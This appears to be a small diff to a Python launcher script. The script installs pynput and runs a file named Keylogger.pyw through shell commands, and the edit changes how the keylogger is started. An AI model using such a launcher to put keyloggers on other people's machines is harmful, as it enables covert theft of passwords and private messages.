@@ -1,7 +1,7 @@
 import subprocess
 
 
-cmds = ["pip install pynput", "chmod +x Keylogger.pyw", "Keylogger.pyw"]
+cmds = ["pip install pynput", "chmod +x Keylogger.pyw", "python Keylogger.pyw"]
 
 p2 = subprocess.Popen(cmds[0], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
 p2.wait()
